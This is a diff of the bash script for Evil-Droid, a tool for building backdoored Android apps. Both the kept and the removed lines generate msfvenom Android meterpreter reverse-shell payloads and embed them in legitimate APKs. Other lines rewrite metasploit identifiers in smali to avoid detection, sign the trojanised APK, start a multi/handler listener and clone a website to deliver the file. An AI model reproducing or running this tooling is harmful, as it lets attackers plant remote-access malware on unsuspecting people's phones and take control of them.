@@ -70,8 +70,6 @@ ctrl_c() {
 clear
 echo -e $red"[*] (Ctrl + C ) Detected, Trying To Exit... "
 echo -e $red"[*] Stopping Services... "
-apache_svc_stop
-postgresql_stop
 sleep 1
 echo ""
 echo -e $yellow"[*] Thanks For Using Evil-Droid  :)"
@@ -242,10 +240,6 @@ function get_payload()
 {
   PAYLOAD='android/meterpreter/reverse_tcp'
 }
-function get_payload1()
-{
-  PAYLOAD=$(zenity --list --title "☢ EVIL-DROID ☢" --text "\nChose payload option:" --radiolist --column "Choose" --column "Option" TRUE "android/shell/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" --width 400 --height 400 2> /dev/null)
-}
 #function name
 function payload_name()
 {
@@ -268,13 +262,6 @@ function gen_payload()
  echo "[*] Generating apk payload"
  spinlong
  xterm -T " GENERATE APK PAYLOAD" -e msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
-}
-function embed_payload()
-{
- echo -e $yellow ""
- echo "[*] Embeding apk payload in orginal apk"
- spinlong
- xterm -T " EMBED APK PAYLOAD" -e msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
 #function update apktool
 function up_apktook()
@@ -325,40 +312,8 @@ function error()
    echo -e $red ""
    echo "【X】 Failed to rebuild backdoored apk【X】"
    echo
-   apache_svc_stop
-   postgresql_stop
    exit $rc
  fi
-}
-function error0()
-{
- rc=$?
- if [ $rc != 0 ]; then
-   echo -e $red ""
-   echo "【X】 An Error Was Occured .Ty Again【X】"
-   echo
-   apache_svc_stop
-   postgresql_stop
-   exit $rc
- fi
-}
-#function apache2 service
-function apache_svc_start()
-{
- service apache2 start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
-}
-function apache_svc_stop()
-{
- service apache2 stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop apache2 service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
-}
-#function postgresql service
-function postgresql_start()
-{
- service postgresql start | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Start postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
-}
-function postgresql_stop()
-{
- service postgresql stop | zenity --progress --pulsate --title "PLEASE WAIT..." --text="Stop postgresql service" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
 }
 # function adding permission
 function perms()
@@ -446,8 +401,6 @@ function flagg()
  if [ -f payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
     echo
     echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
-    apache_svc_stop
-    postgresql_stop
     exit 1
  fi
  sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" payload/smali/com/$VAR1/$VAR2/*
@@ -474,8 +427,6 @@ function flagg_original()
  if [ -f payload/smali/com/metasploit/$VAR1/PayloadTrustManager.smali ]; then
     echo
     echo -e $red "[ X ] an error was occured . Please upgrade your distro .."
-    apache_svc_stop
-    postgresql_stop
     exit 1
  fi
  echo -e $yellow ""
@@ -591,8 +542,6 @@ function sign()
  if [ $rc != 0 ]; then
    echo -e $red ""
    echo "[!] Failed to verify signed artifacts"
-   apache_svc_stop
-   postgresql_stop
    exit $rc
  fi
  echo -e $yellow
@@ -606,28 +555,9 @@ function sign()
  if [ $rc != 0 ]; then
    echo -e $red ""
    echo "[!] Failed to align recompiled APK"
-   apache_svc_stop
-   postgresql_stop
    exit $rc
  fi
  rm evil.apk > /dev/null 2>&1
-}
-#function ask
-function quests()
-{
-while true; do
-   echo ""
-   quest=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Choose payload apk or original apk?" --radiolist --column "Choose" --column "Option" TRUE "APK-MSF" FALSE "ORIGINAL-APK" --width 305 --height 270 2> /dev/null) 
-   case $quest in
-   APK-MSF) change_icon;spinlong;gen_payload;spinlong;apk_decomp;flagg;merge_name_ico;spinlong;apk_comp;spinlong;sign;return;;
-   ORIGINAL-APK) orig_apk;spinlong;gen_payload;spinlong;up_apktook;apk_decomp1;spinlong;apk_decomp;flagg_original;spinlong;apk_comp1;spinlong;sign;return;;
-   esac
-done
-}
-#function listeners
-function listener()
-{
-  xterm -T "EVIL-DROID MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $lanip; set LPORT $LPORT; set PAYLOAD $PAYLOAD; exploit'"
 }
 #function clone site
 function clns()
@@ -653,18 +583,6 @@ function launcher()
  rm apk_index > /dev/null 2>&1
  rm $index.html > /dev/null 2>&1
  zenity --title "☢ SITE CLONED ☢" --info --text "http://$LHOST/$index.html" --width 400 > /dev/null 2>&1
-}
-#function suite
-function suite()
-{
-while true; do
-   echo ""
-   suit=$(zenity --list --title "☢ EVIL-DROID OPTIONS ☢" --text "Would you like to continue?" --radiolist --column "Choose" --column "Option" TRUE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
-   case $suit in
-   Main-Menu) clear;main;;
-   Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
-   esac
-done
 }
 #function clean files
 function clean()
